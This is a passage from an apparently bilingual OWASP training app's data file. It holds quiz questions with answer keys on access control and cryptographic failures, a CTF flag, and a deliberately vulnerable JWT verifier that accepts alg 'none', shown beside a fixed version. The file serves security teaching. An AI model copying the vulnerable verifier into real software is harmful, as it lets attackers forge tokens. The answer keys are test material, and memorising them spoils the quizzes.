        q: M('Согласно OWASP, «Modeling access controls should enforce _____ rather than allowing users to CRUD any record» — пропущенное слово:', 'Per OWASP, "Modeling access controls should enforce _____ rather than allowing users to CRUD any record" — the missing phrase:'),
        opts: [
          M('session duration', 'session duration'),
          M('role hierarchy', 'role hierarchy'),
          M('IP whitelisting', 'IP whitelisting'),
          M('record ownership', 'record ownership'),
        ],
        ans: 3,
        e: M('OWASP подчёркивает enforcement владения записью (record ownership), чтобы пользователь не мог CRUD произвольные записи только зная id.', 'OWASP guidance stresses enforcing record ownership in the access model so users cannot CRUD arbitrary records just because they know an id.'),
      },
      {
        q: M('Как правильнее всего протестировать BFLA для эндпоинта /admin/deleteUser?', 'What\'s the correct way to test BFLA on an endpoint like /admin/deleteUser?'),
        opts: [
          M('Отправить прямой HTTP-запрос от имени low-priv пользователя напрямую (curl/Burp), минуя UI', 'Send a direct HTTP request as a low-priv user directly (curl/Burp), bypassing the UI'),
          M('Прочитать документацию API', 'Read the API documentation'),
          M('Проверить логи сервера', 'Check server logs'),
          M('Проверить, что кнопка недоступна обычному пользователю в UI', 'Check that the button is unavailable to a regular user in the UI'),
        ],
        ans: 0,
        e: M('BFLA доказывается прямым вызовом привилегированной функции от low-priv пользователя (curl/Burp). Скрытие кнопки в UI не доказывает серверный отказ.', 'BFLA is proven by calling the privileged function as a low-privilege user directly (curl/Burp). UI button visibility alone does not prove server-side denial.'),
      },
      {
        q: M('Какой из перечисленных методов атаки НЕ относится к Broken Access Control?', 'Which attack technique does NOT belong to Broken Access Control?'),
        opts: [
          M('JWT alg=none', 'JWT alg=none'),
          M('Time-based blind SQL injection', 'Time-based blind SQL injection'),
          M('Force browsing', 'Force browsing'),
          M('Parameter tampering', 'Parameter tampering'),
        ],
        ans: 1,
        e: M('Time-based blind SQL injection — техника Injection (A05). Parameter tampering, JWT alg=none и force browsing относятся к контролю доступа.', 'Time-based blind SQL injection is an Injection (A05) technique. Parameter tampering, JWT alg=none, and force browsing are access-control related.'),
      },
      {
        q: M('Использование ролевой модели (RBAC) само по себе гарантирует отсутствие Broken Access Control?', 'Does using a role-based model (RBAC) alone guarantee the absence of Broken Access Control?'),
        opts: [
          M('Да, всегда', 'Yes, always'),
          M('Да, если приложение написано на Java', 'Yes, if the app is written in Java'),
          M('Нет — плохая реализация проверки роли на сервере всё равно может быть уязвима', 'No — a poor server-side implementation of the role check can still be vulnerable'),
          M('Да, если используется JWT', 'Yes, if JWT is used'),
        ],
        ans: 2,
        e: M('RBAC помогает только если роли корректно проверяются на сервере на каждом чувствительном пути. Модель без правильного enforcement всё равно даёт Broken Access Control.', 'RBAC only helps if roles are checked correctly on every sensitive path server-side. A model without sound enforcement still yields Broken Access Control.'),
      },
      {
        q: M('Что из перечисленного — правильный порядок действий при обнаружении IDOR на пентесте?', 'What\'s the correct sequence of actions when an IDOR is found during a pentest?'),
        opts: [
          M('Сразу публиковать в соцсетях', 'Immediately post about it on social media'),
          M('Игнорировать, если severity низкий', 'Ignore it if the severity seems low'),
          M('Массово скачать данные всех пользователей для «доказательства»', 'Mass-download every user\'s data as "proof"'),
          M('Задокументировать PoC, оценить impact (какие данные доступны), сообщить по программе ответственного разглашения/bug bounty', 'Document a PoC, assess impact (what data is exposed), report through the responsible-disclosure/bug bounty program'),
        ],
        ans: 3,
        e: M('Этичный процесс: PoC, оценка impact и отчёт через responsible disclosure/bug bounty — без публичных сливов и массовой выгрузки чужих данных.', 'Ethical process is PoC documentation, impact assessment, and report via responsible disclosure or bug bounty — not public dumps or mass data exfiltration.'),
      },
      {
        q: M('CWE-425 (Direct Request/Forced Browsing) чаще всего выявляется тестировщиком через:', 'CWE-425 (Direct Request/Forced Browsing) is most often found by a tester through:'),
        opts: [
          M('попытку прямого доступа к известным/предполагаемым путям без прохождения обычного flow навигации', 'attempting direct access to known/predicted paths without going through the normal navigation flow'),
          M('фаззинг форм ввода', 'fuzzing input forms'),
          M('проверку заголовков ответа', 'checking response headers'),
          M('статический анализ кода на XSS', 'static code analysis for XSS'),
        ],
        ans: 0,
        e: M('CWE-425 находят прямыми запросами к известным или предсказуемым путям и admin URL вне обычной навигации UI — forced browsing незащищённых ресурсов.', 'CWE-425 is found by requesting known or predicted paths and admin URLs outside the normal UI flow, proving forced browsing of unprotected resources.'),
      },
      {
        q: M('В чём разница между Authentication и Authorization в контексте A01?', 'What\'s the difference between Authentication and Authorization in the context of A01?'),
        opts: [
          M('Это одно и то же', 'They\'re the same thing'),
          M('Authentication — кто ты, Authorization — что тебе разрешено делать', 'Authentication is who you are, Authorization is what you\'re allowed to do'),
          M('Authentication относится только к API', 'Authentication only applies to APIs'),
          M('Authorization относится только к паролям', 'Authorization only applies to passwords'),
        ],
        ans: 1,
        e: M('Authentication — кто вы; authorization — что вам разрешено. A01 в основном о сбоях enforcement авторизации при (или без) корректной идентификации.', 'Authentication establishes identity; authorization decides permitted actions. A01 is mainly about authorization enforcement failures after (or without) proper identity checks.'),
      },
      {
        q: M('Приложение проверяет права на фронтенде, но REST API не проверяет их на бэкенде. Какой инструмент лучше всего выявит проблему?', 'An app checks permissions on the frontend, but the REST API doesn\'t verify them server-side. Which tool best exposes this?'),
        opts: [
          M('Nmap', 'Nmap'),
          M('Wireshark для анализа Wi-Fi', 'Wireshark for Wi-Fi analysis'),
          M('curl/Postman/Burp — прямой вызов API в обход фронтенда', 'curl/Postman/Burp — calling the API directly, bypassing the frontend'),
          M('John the Ripper', 'John the Ripper'),
        ],
        ans: 2,
        e: M('Прямые вызовы API через curl, Postman или Burp обходят frontend-проверки UI и показывают, enforced ли авторизация на сервере независимо.', 'Direct API calls with curl, Postman, or Burp bypass the frontend permission UI and show whether the server enforces authorization independently.'),
      },
      {
        q: M('Согласно OWASP-рекомендациям, unit- и integration-тесты должны включать:', 'Per OWASP recommendations, unit and integration tests should include:'),
        opts: [
          M('только нагрузочное тестирование', 'only load testing'),
          M('только позитивные сценарии (happy path)', 'only happy-path scenarios'),
          M('только UI-тесты', 'only UI tests'),
          M('функциональные тесты access control (проверка отказа для неавторизованных ролей)', 'functional access-control tests (verifying denial for unauthorized roles)'),
        ],
        ans: 3,
        e: M('OWASP рекомендует функциональные тесты access control, проверяющие отказ для неавторизованных ролей, а не только happy-path сценарии.', 'OWASP recommends automated functional tests that assert unauthorized roles are denied, not only happy-path success scenarios.'),
      },
      {
        q: M('Что из следующего лучше всего описывает root cause категории Broken Access Control в целом?', 'Which of the following best describes the root cause of Broken Access Control as a whole?'),
        opts: [
          M('Разрыв между декларируемой политикой доступа и её реальным принудительным применением (enforcement) в доверенном серверном коде', 'The gap between the declared access policy and its actual enforcement in trusted server-side code'),
          M('Отсутствие HTTPS', 'Lack of HTTPS'),
          M('Слабый пароль пользователя', 'A weak user password'),
          M('Устаревшая версия фреймворка', 'An outdated framework version'),
        ],
        ans: 0,
        e: M('Корневая причина — разрыв между заявленной политикой доступа и тем, что реально enforced в доверенном server-side коде для каждого запроса и ресурса.', 'Root cause is the gap between the stated access policy and what trusted server-side code actually enforces on each request and resource.'),
      },
      {
        q: M('Какая мера НАИБОЛЕЕ эффективна против массовой автоматизированной эксплуатации IDOR через инкрементный перебор ID?', 'Which measure is MOST effective against mass automated exploitation of IDOR via sequential ID enumeration?'),
        opts: [
          M('Смена языка программирования', 'Switching programming languages'),
          M('Использование случайных UUID вместо последовательных ID + обязательная проверка владения записью на сервере', 'Using random UUIDs instead of sequential IDs + mandatory server-side ownership checks'),
          M('Отключение JavaScript', 'Disabling JavaScript'),
          M('Увеличение длины пароля', 'Increasing password length'),
        ],
        ans: 1,
        e: M('Случайные UUID затрудняют массовый перебор, а обязательные server-side ownership checks блокируют IDOR даже при известном id — вместе это наиболее эффективно.', 'Random UUIDs slow mass sequential guessing, but mandatory server-side ownership checks stop IDOR even if an id is known — both together are most effective.'),
      },
    ],
  },
  {
    code: 'A02', name: 'Cryptographic Failures', nameRu: 'Криптографические сбои',
    risk: 'HIGH', owasp2021: 'A02', owasp2025: 'A04',
    cwe: ['CWE-327', 'CWE-328', 'CWE-311', 'CWE-319'],
    flag: 'FLAG{jwt_alg_none_is_not_secure}',
    blurb: M('Слабые хеши, MD5, JWT с alg:none и секреты в открытом виде.', 'Weak hashes, MD5, JWT alg:none, plaintext secrets.'),
    theory: M(
`<p><strong>Cryptographic Failures</strong> — не отсутствие криптографии, а её неправильное применение.</p>
<p>Паттерны: MD5/SHA-1 без соли, plaintext storage, SSLv3/RC4, hard-coded keys, <strong>JWT alg:none</strong>.</p>
<div class="ebox">// Уязвимо
pwd = md5(password)           // GPU: сотни GH/s
token = jwt.encode(payload, '', algorithm='none')

// Безопасно
pwd = argon2id(password, salt, m=64MB, t=3)
token = jwt.encode(payload, secret, algorithm='HS256')
// + whitelist algorithms на verify</div>
<p><strong>CVE-2014-0160 Heartbleed</strong>, <strong>CVE-2023-4966 CitrixBleed</strong> — утечки памяти с сессиями/ключами.</p>`,
`<p><strong>Cryptographic Failures</strong> are not missing crypto — they are crypto used wrongly.</p>
<p>Patterns: unsalted MD5/SHA-1, plaintext storage, SSLv3/RC4, hard-coded keys, <strong>JWT alg:none</strong>.</p>
<div class="ebox">// Vulnerable
pwd = md5(password)           // GPU: hundreds of GH/s
token = jwt.encode(payload, '', algorithm='none')

// Secure
pwd = argon2id(password, salt, m=64MB, t=3)
token = jwt.encode(payload, secret, algorithm='HS256')
// + algorithm whitelist on verify</div>
<p><strong>CVE-2014-0160 Heartbleed</strong>, <strong>CVE-2023-4966 CitrixBleed</strong> — memory leaks of sessions/keys.</p>`
    ),
    vulnCode: `// JWT without alg check
function verify(token) {
  const [h, p, s] = token.split('.');
  const header = JSON.parse(atob(h));
  if (header.alg === 'none') return JSON.parse(atob(p)); // 💀
  return hmacVerify(token, SECRET);
}`,
    fixCode: `// Algorithm whitelist
function verify(token) {
  const header = JSON.parse(atob(token.split('.')[0]));
  if (!['HS256','RS256'].includes(header.alg))
    throw new Error('alg not allowed');
  return jwt.verify(token, SECRET, { algorithms: ['HS256'] });
}`,
    quiz: [
      {
        q: M('Как называлась категория Cryptographic Failures до переименования в 2021 году?', 'What was the Cryptographic Failures category called before its 2021 renaming?'),
        opts: [
          M('Injection', 'Injection'),
          M('XXE', 'XXE'),
          M('Sensitive Data Exposure', 'Sensitive Data Exposure'),
          M('Broken Authentication', 'Broken Authentication'),
        ],
        ans: 2,
        e: M('До переименования в 2021 категория называлась Sensitive Data Exposure (OWASP 2017); в 2021/2025 акцент смещён на root cause — Cryptographic Failures.', 'Before the 2021 rename the category was Sensitive Data Exposure (OWASP 2017); 2021/2025 focus on the root cause — Cryptographic Failures.'),
      },
      {
        q: M('Почему переименование в «Cryptographic Failures» точнее отражает суть категории?', 'Why does renaming it to "Cryptographic Failures" better capture the essence of the category?'),
        opts: [
          M('Старое название было запрещено', 'The old name was prohibited'),
          M('Новое название короче', 'The new name is shorter'),
          M('Это чисто маркетинговое изменение', 'It\'s purely a marketing change'),
          M('Exposure — симптом, Cryptographic Failure — root cause, приводящий к exposure', 'Exposure is a symptom, Cryptographic Failure is the root cause leading to exposure'),
        ],
        ans: 3,
        e: M('«Exposure» — симптом (данные утекли), а «Cryptographic Failure» — причина: слабая/отсутствующая криптозащита, из-за которой exposure и происходит.', '"Exposure" is a symptom (data leaked), while "Cryptographic Failure" is the root cause: weak or missing crypto that leads to that exposure.'),
      },
      {
        q: M('Какой алгоритм хеширования паролей считается устойчивым к брутфорсу и рекомендуется OWASP?', 'Which password-hashing algorithm is considered brute-force-resistant and recommended by OWASP?'),
        opts: [
          M('Argon2id', 'Argon2id'),
          M('CRC32', 'CRC32'),
          M('SHA-1', 'SHA-1'),
          M('MD5', 'MD5'),
        ],
        ans: 0,
        e: M('Argon2id — современная memory-hard KDF, устойчивая к брутфорсу на GPU/ASIC; OWASP рекомендует её (наряду с bcrypt/scrypt) для хранения паролей.', 'Argon2id is a modern memory-hard KDF resistant to GPU/ASIC brute-force; OWASP recommends it (alongside bcrypt/scrypt) for password storage.'),
      },
      {
        q: M('ECB (Electronic Codebook) режим шифрования опасен, потому что:', 'ECB (Electronic Codebook) mode is dangerous because:'),
        opts: [
          M('он не поддерживается современными библиотеками', 'it\'s unsupported by modern libraries'),
          M('одинаковые блоки открытого текста дают одинаковые блоки шифротекста, раскрывая паттерны данных', 'identical plaintext blocks yield identical ciphertext blocks, revealing data patterns'),
          M('требует слишком длинного ключа', 'it requires an excessively long key'),
          M('он слишком медленный', 'it\'s too slow'),
        ],
        ans: 1,
        e: M('В режиме ECB одинаковые блоки plaintext всегда дают одинаковые блоки ciphertext, из-за чего видны паттерны и структура данных — режим считается небезопасным.', 'In ECB mode identical plaintext blocks always produce identical ciphertext blocks, revealing data patterns and structure — the mode is considered insecure.'),
      },
      {
        q: M('Что из перечисленного НЕ является защитой данных, а лишь кодированием?', 'Which of the following is NOT protection of data, only encoding?'),
        opts: [
          M('TLS 1.3', 'TLS 1.3'),
          M('bcrypt', 'bcrypt'),
          M('Base64', 'Base64'),
          M('AES-256', 'AES-256'),
        ],
        ans: 2,
        e: M('Base64 — это кодирование, а не шифрование: данные обратимы без ключа и не обеспечивают конфиденциальность, в отличие от AES, bcrypt или TLS.', 'Base64 is encoding, not encryption: data is reversible without a key and provides no confidentiality, unlike AES, bcrypt, or TLS.'),
      },
      {
        q: M('Почему хранение паролей через быстрый хеш (например, простой SHA-256 без соли и итераций) считается уязвимостью?', 'Why is storing passwords with a fast hash (e.g., plain SHA-256 with no salt or iterations) considered a vulnerability?'),
        opts: [
          M('SHA-256 несовместим с базами данных', 'SHA-256 is incompatible with databases'),
          M('SHA-256 вообще нельзя использовать нигде', 'SHA-256 can never be used anywhere'),
          M('SHA-256 не поддерживается в HTTPS', 'SHA-256 isn\'t supported over HTTPS'),
          M('Быстрые алгоритмы позволяют атакующему перебирать миллиарды вариантов паролей в секунду при офлайн-атаке (brute-force/rainbow tables)', 'Fast algorithms let an attacker try billions of password guesses per second in an offline attack (brute-force/rainbow tables)'),
        ],
        ans: 3,
        e: M('Быстрые хеши (SHA-256 без соли/итераций) позволяют перебирать миллиарды паролей в секунду offline; для паролей нужны медленные KDF с солью.', 'Fast hashes (SHA-256 without salt/iterations) allow billions of offline password guesses per second; passwords need slow salted KDFs.'),
      },
      {
        q: M('Соль (salt) в хешировании паролей нужна для:', 'A salt in password hashing is used to:'),
        opts: [
          M('предотвращения использования предвычисленных rainbow-таблиц и одинаковых хешей у пользователей с одинаковыми паролями', 'prevent the use of precomputed rainbow tables and identical hashes for users with identical passwords'),
          M('генерации сессионных токенов', 'generate session tokens'),
          M('шифрования трафика', 'encrypt traffic'),
          M('увеличения скорости вычисления хеша', 'speed up hash computation'),
        ],
        ans: 0,
        e: M('Соль делает хеш каждого пароля уникальным: ломает rainbow tables и не даёт узнать, что у разных пользователей одинаковый пароль по совпадению хешей.', 'A salt makes each password hash unique: it defeats rainbow tables and prevents revealing identical passwords across users via matching hashes.'),
      },
      {
        q: M('Padding oracle атака эксплуатирует:', 'A padding oracle attack exploits:'),
        opts: [
          M('отсутствие HTTPS', 'lack of HTTPS'),
          M('утечку информации через различие в ответах сервера при обработке некорректного padding в блочном шифровании (например, CBC-режим)', 'an information leak through a difference in server responses when handling incorrect padding in block-cipher encryption (e.g., CBC mode)'),
          M('SQL-инъекцию', 'SQL injection'),
          M('слабость алгоритма хеширования', 'a weak hashing algorithm'),
        ],
        ans: 1,
        e: M('Padding oracle эксплуатирует разницу ответов сервера при неверном padding блочного шифра (часто CBC), позволяя постепенно расшифровать или подделать ciphertext.', 'A padding oracle exploits differing server responses to invalid block-cipher padding (often CBC), enabling gradual decryption or forgery of ciphertext.'),
      },
      {
        q: M('Средний incidence rate для категории A04:2025 составил:', 'The average incidence rate for A04:2025 was:'),
        opts: [
          M('15%', '15%'),
          M('0.5%', '0.5%'),
          M('3.80%', '3.80%'),
          M('50%', '50%'),
        ],
        ans: 2,
        e: M('По данным OWASP Top 10:2025, средний incidence rate для A04 Cryptographic Failures составляет 3.80%.', 'Per OWASP Top 10:2025 data, the average incidence rate for A04 Cryptographic Failures is 3.80%.'),
      },
      {
        q: M('Почему собственная («самописная») криптография — плохая практика?', 'Why is "homegrown" (custom) cryptography a bad practice?'),
        opts: [
          M('Она всегда медленнее', 'It\'s always slower'),
          M('Не поддерживается современными языками программирования', 'It\'s unsupported by modern programming languages'),
          M('Собственная криптография запрещена законом везде', 'Homegrown crypto is illegal everywhere'),
          M('Крипто-алгоритмы крайне сложно спроектировать безопасно; непроверенные реализации часто содержат неочевидные уязвимости, не выявляемые без глубокого криптоанализа', 'Crypto algorithms are extremely hard to design securely; unvetted implementations often contain subtle flaws not caught without deep cryptanalysis'),
        ],
        ans: 3,
        e: M('Собственная («homegrown») криптография почти всегда содержит тонкие ошибки; безопасные алгоритмы требуют многолетнего анализа — используйте проверенные библиотеки.', 'Homegrown cryptography almost always hides subtle flaws; secure algorithms need years of analysis — use vetted libraries and standards.'),
      },
      {
        q: M('Какой протокол/версия НЕ рекомендуется OWASP для защиты данных in transit в 2025?', 'Which protocol/version is NOT recommended by OWASP for protecting data in transit in 2025?'),
        opts: [
          M('SSL 3.0/TLS 1.0', 'SSL 3.0/TLS 1.0'),
          M('TLS 1.3', 'TLS 1.3'),
          M('mTLS', 'mTLS'),
          M('TLS 1.2', 'TLS 1.2'),
        ],
        ans: 0,
        e: M('SSL 3.0 и TLS 1.0 устарели и уязвимы (POODLE и др.); OWASP рекомендует TLS 1.2+ / 1.3, а не legacy-протоколы.', 'SSL 3.0 and TLS 1.0 are obsolete and vulnerable (e.g., POODLE); OWASP recommends TLS 1.2+/1.3, not legacy protocols.'),
      },
      {
        q: M('HSTS (HTTP Strict Transport Security) относится к:', 'HSTS (HTTP Strict Transport Security) relates to:'),
        opts: [
          M('шифрованию паролей в БД', 'encrypting passwords in the DB'),
          M('принудительному использованию HTTPS браузером, предотвращая downgrade-атаки', 'forcing browsers to use HTTPS, preventing downgrade attacks'),
          M('авторизации API', 'API authorization'),
          M('защите от XSS', 'protecting against XSS'),
        ],
        ans: 1,
        e: M('HSTS заставляет браузер всегда использовать HTTPS для сайта, снижая риск downgrade-атак и случайного HTTP-доступа к ресурсу.', 'HSTS forces the browser to use HTTPS for the site, reducing downgrade attacks and accidental HTTP access to the resource.'),
      },
      {
        q: M('Данные, передаваемые через query string URL (например, ?token=secret), опасны, потому что:', 'Data transmitted via a URL query string (e.g., ?token=secret) is dangerous because:'),
        opts: [
          M('URL ограничен по длине', 'URLs have a length limit'),
          M('URL не поддерживает Unicode', 'URLs don\'t support Unicode'),
          M('URL часто логируются серверами, прокси, историей браузера — токен может утечь через логи', 'URLs are often logged by servers, proxies, and browser history — a token can leak via logs'),
          M('URL нельзя использовать с HTTPS', 'URLs can\'t be used with HTTPS'),
        ],
        ans: 2,
        e: M('Секреты в query string попадают в логи серверов, прокси, history и Referer; токен может утечь даже без прямого перехвата трафика.', 'Secrets in the query string appear in server/proxy logs, browser history, and Referer headers; tokens can leak without live traffic interception.'),
      },
      {
        q: M('Что из перечисленного — правильная практика управления криптографическими ключами?', 'Which of the following is a correct cryptographic key-management practice?'),
        opts: [
          M('Хранить ключи в исходном коде для удобства доступа', 'Store keys in source code for easy access'),
          M('Никогда не менять ключи после первоначальной настройки', 'Never rotate keys after initial setup'),
          M('Использовать один и тот же ключ для всех сред (dev/staging/prod)', 'Use the same key across all environments (dev/staging/prod)'),
          M('Использовать выделенное управление ключами (KMS/HSM) с ротацией и разделением ключей от данных', 'Use dedicated key management (KMS/HSM) with rotation and separation of keys from data'),
        ],
        ans: 3,
        e: M('Корректное управление ключами — KMS/HSM, ротация и отделение ключей от данных; ключи не должны храниться рядом с зашифрованным контентом «как есть».', 'Correct key management uses KMS/HSM, rotation, and separating keys from data; keys must not live next to ciphertext unprotected.'),
      },
      {
        q: M('Данные, которые не нуждаются в шифровании согласно принципу data minimization, следует:', 'Data that doesn\'t need protection per the data-minimization principle should:'),
        opts: [
          M('вообще не собирать/не хранить, если они не нужны для бизнес-процесса', 'not be collected/stored at all if not needed for the business process'),
          M('публиковать в открытом доступе', 'be published openly'),
          M('шифровать «на всякий случай» всегда', 'always be encrypted "just in case"'),
          M('хранить в открытом виде для удобства', 'be stored in plaintext for convenience'),
        ],
        ans: 0,
        e: M('Data minimization: если данные не нужны бизнес-процессу, их не следует собирать и хранить — лучшая защита, чем любое шифрование ненужных данных.', 'Data minimization: if data is not needed for the business process, do not collect or store it — better than encrypting unnecessary data.'),
      },
      {
        q: M('IV (initialization vector), используемый повторно при CBC-шифровании, приводит к:', 'An IV (initialization vector) reused across CBC encryption operations leads to:'),
        opts: [
          M('увеличению производительности', 'increased performance'),
          M('утечке информации о паттернах в зашифрованных данных, ослаблению криптографической стойкости', 'information leakage about patterns in the encrypted data, weakening cryptographic strength'),
          M('автоматическому обновлению ключа', 'automatic key rotation'),
          M('невозможности расшифровки данных', 'an inability to decrypt the data'),
        ],
        ans: 1,
        e: M('Повтор IV в CBC раскрывает связи между блоками plaintext и ослабляет криптостойкость; IV должен быть уникальным (и для многих режимов — непредсказуемым).', 'Reusing an IV in CBC leaks relationships between plaintext blocks and weakens strength; IVs must be unique (and often unpredictable).'),
      },
      {
        q: M('Что из перечисленного является примером Cryptographic Failure, а не Broken Access Control?', 'Which of the following is an example of a Cryptographic Failure, not a Broken Access Control issue?'),
        opts: [
          M('IDOR через прямое изменение ID в URL', 'IDOR via directly changing an ID in the URL'),
          M('CSRF без токена', 'CSRF with no token'),
          M('Хранение номеров кредитных карт в БД без шифрования, в открытом виде', 'Storing credit card numbers in the DB unencrypted, in plaintext'),
          M('Отсутствие проверки роли на эндпоинте', 'Missing role check on an endpoint'),
        ],
        ans: 2,
        e: M('Хранение номеров карт в БД в открытом виде — провал криптозащиты данных at rest (A04), а не ошибка проверки прав доступа (Broken Access Control).', 'Storing card numbers in the DB in plaintext is a failure of data-at-rest crypto (A04), not an access-control authorization flaw.'),
      },
      {
        q: M('Почему отключение кэширования важно для откликов, содержащих чувствительные данные?', 'Why does disabling caching matter for responses containing sensitive data?'),
        opts: [
          M('Кэш замедляет сервер', 'Caching slows down the server'),
          M('Кэш всегда шифруется автоматически', 'Caches are always automatically encrypted'),
          M('Не имеет отношения к безопасности', 'It\'s unrelated to security'),
          M('Кэшированные данные могут остаться доступны в браузере/промежуточных прокси после того, как сессия должна была завершиться', 'Cached data may remain accessible in the browser/intermediate proxies after the session should have ended'),
        ],
        ans: 3,
        e: M('Кэш браузера и промежуточных прокси может сохранить чувствительный ответ после окончания сессии; для таких ответов кэширование отключают.', 'Browser and proxy caches can retain sensitive responses after the session ends; caching must be disabled for such responses.'),
      },
      {
        q: M('Верификация сертификата и цепочки доверия TLS-соединения важна, потому что:', 'Why does verifying the TLS certificate and trust chain matter?'),
        opts: [
          M('игнорирование ошибок сертификата открывает возможность MITM-атаки', 'Ignoring certificate errors opens the door to a MITM attack'),
          M('требуется только для мобильных приложений', 'Required only for mobile apps'),
          M('сертификаты не имеют отношения к шифрованию', 'Certificates are unrelated to encryption'),
          M('без неё HTTPS не будет работать физически', 'Without it, HTTPS won\'t physically work'),
        ],
        ans: 0,
        e: M('Без проверки сертификата и цепочки доверия клиент примет поддельный сертификат атакующего — открывается MITM и перехват/подмена трафика.', 'Without verifying the certificate and trust chain, a client accepts an attacker\'s fake cert — enabling MITM interception and modification.'),
      },
      {
        q: M('NIST 800-63b рекомендации по паролям, упомянутые в контексте OWASP A07, но пересекающиеся с A04 в части хранения, подчёркивают, что:', 'NIST 800-63b password recommendations, referenced in the context of OWASP A07 but overlapping with A04\'s storage aspects, emphasize that:'),
        opts: [
          M('пароли не нужно хешировать вообще', 'passwords don\'t need to be hashed at all'),
          M('длина важнее навязанной сложности (спецсимволов), плюс проверка по спискам скомпрометированных паролей', 'length matters more than imposed complexity (special characters), plus checking against compromised-password lists'),
          M('MFA не требуется при длинных паролях', 'MFA isn\'t needed with long passwords'),
          M('сложность важнее длины', 'complexity matters more than length'),
        ],
        ans: 1,
        e: M('NIST 800-63B делает упор на длину пароля, а не на жёсткие правила спецсимволов, плюс проверку по спискам скомпрометированных паролей.', 'NIST 800-63B emphasizes password length over forced special-character complexity, plus checks against compromised-password lists.'),
      },
      {
        q: M('Какой из перечисленных классов данных требует защиты согласно применимым нормам (GDPR, PCI DSS, HIPAA)?', 'Which of the following data classes requires protection per applicable regulations (GDPR, PCI DSS, HIPAA)?'),
        opts: [
          M('Только пароли', 'Only passwords'),
          M('Только данные администраторов', 'Only admin data'),
          M('PII, финансовые, медицинские данные, credentials, business secrets — в зависимости от юрисдикции и типа бизнеса', 'PII, financial, medical data, credentials, business secrets — depending on jurisdiction and business type'),
          M('Только данные, хранящиеся в облаке', 'Only cloud-stored data'),
        ],
        ans: 2,
        e: M('Защите подлежат PII, финансовые и медицинские данные, credentials и business secrets — в объёме, который требуют GDPR, PCI DSS, HIPAA и локальные нормы.', 'PII, financial and medical data, credentials, and business secrets require protection under GDPR, PCI DSS, HIPAA, and local rules as applicable.'),
      },
      {
        q: M('Почему сравнение «шифрование vs кодирование» важно для понимания A04?', 'Why does the "encryption vs. encoding" distinction matter for understanding A04?'),
        opts: [
          M('Шифрование и кодирование — синонимы', 'Encoding and encryption are synonyms'),
          M('Кодирование сильнее шифрования', 'Encoding is stronger than encryption'),
          M('Это не имеет практического значения', 'It has no practical significance'),
          M('Кодирование (Base64, URL-encoding) обратимо без ключа и НЕ обеспечивает конфиденциальность, в отличие от шифрования', 'Encoding (Base64, URL-encoding) is reversible without a key and does NOT provide confidentiality, unlike encryption'),
        ],
        ans: 3,
        e: M('Кодирование (Base64, URL-encoding) обратимо без ключа и не даёт конфиденциальности; A04 требует именно шифрования/криптопримитивов, а не «обфускации».', 'Encoding (Base64, URL-encoding) is reversible without a key and gives no confidentiality; A04 requires real encryption/crypto, not obfuscation.'),
      },
      {
        q: M('Атакующий получил доступ к базе данных и видит хеши паролей вида $2b$12$... Какой алгоритм скорее всего использован (судя по формату)?', 'An attacker gains DB access and sees password hashes like $2b$12$... Judging by the format, which algorithm was likely used?'),
        opts: [
          M('bcrypt', 'bcrypt'),
          M('plaintext', 'plaintext'),
          M('Base64', 'Base64'),
          M('MD5', 'MD5'),
        ],
        ans: 0,
        e: M('Префикс $2b$12$… — характерный формат bcrypt (версия 2b, cost 12); такой вид хеша указывает на bcrypt, а не на MD5/SHA/Argon2.', 'The $2b$12$… prefix is the characteristic bcrypt format (version 2b, cost 12), not MD5, SHA, or Argon2.'),
      },
      {
        q: M('Что из перечисленного — правильная практика при обнаружении утечки криптографического ключа?', 'What\'s the correct practice upon discovering a leaked cryptographic key?'),
        opts: [
          M('Удалить упоминание ключа из логов и продолжить использовать тот же ключ', 'Remove mentions of the key from logs and keep using the same key'),
          M('Немедленно ротировать ключ, переоценить все данные, зашифрованные этим ключом, расследовать масштаб компрометации', 'Immediately rotate the key, reassess all data encrypted with it, and investigate the scope of compromise'),
          M('Игнорировать, если утечка не подтверждена публично', 'Ignore it unless the leak is publicly confirmed'),
          M('Подождать планового обновления ключей раз в год', 'Wait for the scheduled annual key update'),
        ],
        ans: 1,
        e: M('При утечке ключа нужно немедленно ротировать его, переоценить данные, зашифрованные старым ключом, и расследовать масштаб компрометации.', 'On key leakage, immediately rotate the key, reassess data encrypted with it, and investigate the scope of compromise.'),
      },
      {
        q: M('DES и RC4 считаются устаревшими алгоритмами, потому что:', 'DES and RC4 are considered obsolete algorithms because:'),
        opts: [
          M('они несовместимы с современными ОС', 'they\'re incompatible with modern OSes'),
          M('не поддерживают Unicode', 'they don\'t support Unicode'),
          M('они криптографически скомпрометированы/слабы по современным стандартам и подвержены практическим атакам', 'they\'re cryptographically broken/weak by modern standards and subject to practical attacks'),
          M('они слишком медленные', 'they\'re too slow'),
        ],
        ans: 2,
        e: M('DES и RC4 криптографически слабы/сломлены по современным стандартам и подвержены практическим атакам; их нельзя использовать для новой защиты.', 'DES and RC4 are cryptographically weak/broken by modern standards and subject to practical attacks; they must not be used for new protection.'),
      },
      {
        q: M('Данные, хранящиеся «дольше необходимого», включая бэкапы и логи, — риск, относящийся к A04, потому что:', 'Data stored "longer than necessary," including backups and logs, is a risk under A04 because:'),
        opts: [
          M('не влияет на безопасность', 'it doesn\'t affect security'),
          M('занимают много места', 'it takes up storage space'),
          M('требуется по закону хранить всё бессрочно', 'it\'s legally required to keep everything indefinitely'),
          M('увеличивают поверхность атаки и объём потенциально утекших чувствительных данных при компрометации, даже если сами не активно используются', 'it increases the attack surface and the volume of potentially leaked sensitive data upon compromise, even if not actively used'),
        ],
        ans: 3,
        e: M('Избыточное хранение (логи, бэкапы «на всякий случай») увеличивает объём данных, которые утекут при компрометации, даже если ими активно не пользуются.', 'Retaining data longer than needed (logs, backups) grows the volume that leaks on compromise, even if it is not actively used.'),
      },
      {
        q: M('Что из перечисленного — НЕ относится к TLS-мисконфигурации, которую стоит проверять пентестеру?', 'Which of the following is NOT a TLS misconfiguration a pentester should check?'),
        opts: [
          M('SQL-инъекция в форме логина', 'SQL injection in a login form'),
          M('Отсутствие HSTS', 'Missing HSTS'),
          M('Использование устаревших cipher suites', 'Use of outdated cipher suites'),
          M('Самоподписанный сертификат в production', 'A self-signed certificate in production'),
        ],
        ans: 0,
        e: M('SQL-инъекция в форме логина — это Injection (A05), а не TLS-мисконфигурация; к TLS относят протоколы, cipher suites, сертификаты, HSTS и т.п.', 'SQL injection in a login form is Injection (A05), not a TLS misconfiguration; TLS checks cover protocols, ciphers, certificates, HSTS, etc.'),
      },
      {
        q: M('testssl.sh как инструмент используется для:', 'testssl.sh as a tool is used to:'),
        opts: [
          M('сканирования открытых портов', 'scan open ports'),
